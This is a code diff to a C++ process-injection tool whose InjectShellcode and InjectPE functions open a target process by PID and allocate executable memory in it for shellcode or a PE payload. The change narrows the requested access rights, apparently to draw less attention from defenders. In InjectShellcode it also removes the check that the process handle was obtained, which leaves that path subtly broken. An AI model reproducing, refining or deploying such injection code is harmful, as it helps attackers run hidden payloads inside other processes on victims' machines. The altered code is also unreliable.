@@ -37,14 +37,7 @@ bool ProcessInjection::InjectShellcode(DWORD pid, const std::vector<uint8_t>& sh
     if (verbose) std::cout << "[*] Detected: Raw shellcode\n";
     if (verbose) std::cout << "[*] Opening existing process PID " << pid << "...\n";
 
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) {
-        std::cout << "[-] OpenProcess failed: error " << GetLastError() << "\n";
-        return false;
-    }
-    if (verbose) std::cout << "[+] Process opened: 0x" << std::hex << (uintptr_t)hProcess << std::dec << "\n";
-
-    if (verbose) std::cout << "[*] Allocating memory (" << shellcode.size() << " bytes)...\n";
+    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
     LPVOID shellcodeAddr = VirtualAllocEx(hProcess, NULL, shellcode.size(),
         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!shellcodeAddr) {
@@ -101,7 +94,7 @@ bool ProcessInjection::InjectPE(DWORD pid, const std::vector<uint8_t>& payload) 
     }
 
     if (verbose) std::cout << "[*] Opening target process PID " << pid << "...\n";
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
     if (!hProcess) {
         std::cout << "[-] OpenProcess failed: error " << GetLastError() << "\n";
         return false;
